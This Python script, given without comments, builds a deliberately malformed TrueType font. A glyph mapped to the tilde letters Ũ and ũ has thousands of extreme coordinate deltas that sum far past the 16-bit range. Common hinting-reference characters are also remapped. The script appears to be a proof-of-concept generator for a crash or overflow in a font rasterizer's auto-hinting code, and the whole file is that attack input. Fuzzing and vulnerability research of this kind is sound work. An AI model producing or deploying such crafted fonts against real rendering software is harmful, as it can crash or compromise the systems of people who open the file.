import struct

UPM = 1024
M = 3000
K = 1

def be16(v): return struct.pack('>H', v & 0xFFFF)
def be16s(v): return struct.pack('>h', v)
def be32(v): return struct.pack('>I', v & 0xFFFFFFFF)

pts = []
pts.append((0, True))
for i in range(M):
    pts.append((32767, True))
PEAK = M * 32767
pts.append((-K, False))
pts.append((0, True))
pts.append((0, False))
pts.append((K, True))
for i in range(M):
    pts.append((-32767, True))

N = len(pts)
deltas = [p[0] for p in pts]
oncurve = [p[1] for p in pts]

flags_bytes = bytearray()
i = 0
while i < N:
    cur_on = oncurve[i]
    FLAG = 0x11 if cur_on else 0x10
    j = i
    while j < N and oncurve[j] == cur_on:
        j += 1
    run = j - i
    k = 0
    while k < run:
        take = min(run - k, 256)
        if take == 1:
            flags_bytes.append(FLAG)
        else:
            flags_bytes.append(FLAG | 0x08)
            flags_bytes.append(take - 1)
        k += take
    i = j

y_bytes = bytearray()
for d in deltas:
    y_bytes += be16s(d)

end_pts = be16(N - 1)
instr_len = be16(0)
glyph1_header = be16s(1) + be16s(0) + be16s(0) + be16s(0) + be16s(32767)
glyph1 = glyph1_header + end_pts + instr_len + bytes(flags_bytes) + bytes(y_bytes)
if len(glyph1) % 2 == 1:
    glyph1 += b'\x00'

glyph0 = be16s(0) + be16s(0) + be16s(0) + be16s(0) + be16s(0)
if len(glyph0) % 2 == 1:
    glyph0 += b'\x00'

rect_pts = [(0, 0), (0, 700), (400, 700), (400, 0)]
rflags = bytes([0x01] * 4)
xs = [p[0] for p in rect_pts]
xdeltas = [xs[0]] + [xs[i] - xs[i - 1] for i in range(1, 4)]
ys2 = [p[1] for p in rect_pts]
ydeltas = [ys2[0]] + [ys2[i] - ys2[i - 1] for i in range(1, 4)]
rx_bytes = b''.join(be16s(d) for d in xdeltas)
ry_bytes = b''.join(be16s(d) for d in ydeltas)
r_end_pts = be16(3)
r_instr = be16(0)
r_header = be16s(1) + be16s(0) + be16s(0) + be16s(400) + be16s(700)
glyph2 = r_header + r_end_pts + r_instr + rflags + rx_bytes + ry_bytes
if len(glyph2) % 2 == 1:
    glyph2 += b'\x00'

glyf = glyph0 + glyph1 + glyph2
loca = (be32(0) + be32(len(glyph0)) +
        be32(len(glyph0) + len(glyph1)) +
        be32(len(glyph0) + len(glyph1) + len(glyph2)))

head = (be16(1) + be16(0) + be32(0x00010000) + be32(0) + be32(0x5F0F3CF5) +
        be16(0) + be16(UPM) + struct.pack('>q', 0) + struct.pack('>q', 0) +
        be16s(0) + be16s(0) + be16s(400) + be16s(32767) + be16(0) + be16(8) +
        be16s(2) + be16s(1) + be16s(0))
maxp = (be32(0x00010000) + be16(3) + be16(20000) + be16(10) + be16(0) + be16(0) +
        be16(1) + be16(0) + be16(0) + be16(0) + be16(0) + be16(0) + be16(0) + be16(0) + be16(0))
hhea = (be16(1) + be16(0) + be16s(800) + be16s(-200) + be16s(0) + be16(1000) +
        be16s(0) + be16s(0) + be16s(1000) + be16s(1) + be16s(0) + be16s(0) +
        be16s(0) + be16s(0) + be16s(0) + be16s(0) + be16s(0) + be16(3))
hmtx = (be16(1000) + be16s(0)) * 3

def sdelta(target_glyph, code):
    return (target_glyph - code) & 0xFFFF

adjust_db = [0x21,0x69,0x6A,0xA1,0xBF,0xC0,0xC1,0xC2,0xC3,0xC8,0xC9,0xCA,0xCC,0xCD,0xCE,0xD1,0xD2,
             0xD3,0xD4,0xD5,0xD9,0xDA,0xDB,0xDD,0xE0,0xE1,0xE2,0xE3,0xE8,0xE9,0xEA,0xEC,0xED,0xEE,
             0xF1,0xF2,0xF3,0xF4,0xF5,0xF9,0xFA,0xFB,0xFD,0x100,0x101,0x102,0x103,0x106,0x107,0x108,
             0x109,0x10A,0x10B,0x10C,0x10D,0x10E,0x112,0x113,0x114,0x115,0x116,0x117,0x11A,0x11B,
             0x11C,0x11D,0x11E,0x11F,0x120,0x121,0x122,0x123,0x124,0x125,0x128,0x129,0x12A,0x12B,
             0x12C,0x12D,0x12F,0x130,0x133,0x134,0x135,0x136,0x137,0x139,0x13A,0x13B,0x13C,0x143,
             0x144,0x145,0x146,0x147,0x148,0x14C,0x14D,0x14E,0x14F,0x154,0x155,0x156,0x157,0x158,
             0x159,0x15A,0x15B,0x15C,0x15D,0x160,0x161,0x164,0x168,0x169,0x16A,0x16B,0x16C,0x16D,
             0x174,0x175,0x176,0x177,0x179,0x17A,0x17B,0x17C,0x17D,0x17E]

blue_chars = "CEHLOQSTUZ" + "bcdefhijknorsuvxz"
codepoints_g2 = set(ord(c) for c in blue_chars) | set(adjust_db)
codepoints_g2.discard(0x169)
codepoints_g2.discard(0x168)

segs = [(cp, cp, sdelta(2, cp)) for cp in sorted(codepoints_g2)]
segs.append((0x168, 0x168, sdelta(1, 0x168)))
segs.append((0x169, 0x169, sdelta(1, 0x169)))
segs.append((0xFFFF, 0xFFFF, sdelta(0, 0xFFFF)))
segs.sort(key=lambda s: s[1])

segCount = len(segs)
segCountX2 = segCount * 2

import math
def largest_pow2_le(n):
    p = 1
    while p * 2 <= n:
        p *= 2
    return p

sr = largest_pow2_le(segCount)
searchRange = sr * 2
entrySelector = int(math.log2(sr))
rangeShift = segCountX2 - searchRange

sub4_body = bytearray()
sub4_body += be16(segCountX2) + be16(searchRange) + be16(entrySelector) + be16(rangeShift)
for s, e, d in segs:
    sub4_body += be16(e)
sub4_body += be16(0)
for s, e, d in segs:
    sub4_body += be16(s)
for s, e, d in segs:
    sub4_body += be16(d)
for s, e, d in segs:
    sub4_body += be16(0)

sub4_full_len = 2 + 2 + 2 + len(sub4_body)
subtable = be16(4) + be16(sub4_full_len) + be16(0) + bytes(sub4_body)

cmap = be16(0) + be16(1) + be16(3) + be16(1) + be32(12) + subtable

tables = {'head': head, 'hhea': hhea, 'hmtx': hmtx, 'maxp': maxp, 'cmap': cmap, 'loca': loca, 'glyf': glyf}
tags_sorted = sorted(tables.keys())
numTables = len(tags_sorted)

def calc_checksum(data):
    if len(data) % 4:
        data = data + b'\x00' * (4 - len(data) % 4)
    s = 0
    for i in range(0, len(data), 4):
        s = (s + struct.unpack('>I', data[i:i + 4])[0]) & 0xFFFFFFFF
    return s

header_size = 12
dir_size = numTables * 16
offset = header_size + dir_size
file_data = bytearray()
entries = []
for tag in tags_sorted:
    data = tables[tag]
    pad = (-len(data)) % 4
    entries.append((tag, calc_checksum(data), offset, len(data)))
    file_data += data
    file_data += b'\x00' * pad
    offset += len(data) + pad

sr2 = largest_pow2_le(numTables)
searchRangeT = sr2 * 16
entrySelectorT = int(math.log2(sr2))
rangeShiftT = numTables * 16 - searchRangeT
sfnt_header = be32(0x00010000) + be16(numTables) + be16(searchRangeT) + be16(entrySelectorT) + be16(rangeShiftT)
dir_bytes = bytearray()
for tag, csum, off, length in entries:
    dir_bytes += tag.encode('ascii') + be32(csum) + be32(off) + be32(length)
font = bytes(sfnt_header) + bytes(dir_bytes) + bytes(file_data)

import sys
outpath = sys.argv[1] if len(sys.argv) > 1 else '/tmp/tilde.ttf'
with open(outpath, 'wb') as f:
    f.write(font)
print("wrote", outpath, len(font), "bytes; PEAK", PEAK, "N", N, "segCount", segCount)
